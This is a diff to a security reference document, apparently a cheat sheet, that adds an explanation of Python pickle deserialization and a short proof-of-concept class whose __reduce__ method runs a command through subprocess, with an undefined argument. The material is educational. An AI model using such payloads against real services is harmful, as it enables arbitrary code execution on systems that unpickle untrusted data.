@@ -48,6 +48,17 @@ A good reference for how these things work is [this Stackoverflow post](https://
 
 ## Pickle Deserialization
 
+During pickle deserialization, it is possible to create a situation where arbitrary code is executed.  This is because the `reduce` method defines how the object itself is de-serialized, and so will be executed when `pickle.loads` is called. 
+
+```py
+import subprocess
+class BadPickle(object):
+    def __reduce__(self):
+        return (subprocess.check_output, (chars,))
+
+print cPickle.dumps(BadPickle())
+```
+
 **Further Reading**  
 [https://blog.nelhage.com/2011/03/exploiting-pickle/](https://blog.nelhage.com/2011/03/exploiting-pickle/)  
 [https://sensepost.com/blog/2010/playing-with-python-pickle-%231/](https://sensepost.com/blog/2010/playing-with-python-pickle-%231/)  
